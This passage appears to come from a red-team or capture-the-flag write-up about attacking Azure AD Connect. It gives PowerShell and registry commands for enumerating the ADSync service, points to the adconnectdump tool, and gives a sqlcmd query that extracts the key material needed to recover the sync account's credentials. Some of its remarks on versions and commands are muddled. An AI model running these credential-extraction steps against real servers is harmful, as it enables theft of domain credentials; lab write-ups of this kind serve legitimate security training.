https://blog.xpnsec.com/azuread-connect-for-redteam/
https://docs.microsoft.com/en-us/azure/active-directory/hybrid/concept-adsync-service-account

We can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking service get name , sc.exe query state= all or wmic.exe net.exe start. If those are denied, we can enumerate the service instance using the Registry. 
```powershell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync

# Gather more information on the image path output from the last cmd
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```

 The [adconnectdump](https://github.com/dirkjanm/adconnectdump) tool can be used to extract the password for the AD Connect Sync Account. The repo mentions that the way that AD connect stores credentials changed. The new version stores credentials using DPAPI and the old version used the Registry. The current version of AD Connect at the time of writing is 1.5.30.0, so the version on the server is unlikely to use DPAPI. This tool works for newer versions of the AD Connect that use DPAPI.

```powershell
#  Use the native SQL Server utility sqlcmd.exe to extract the values from the database.
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```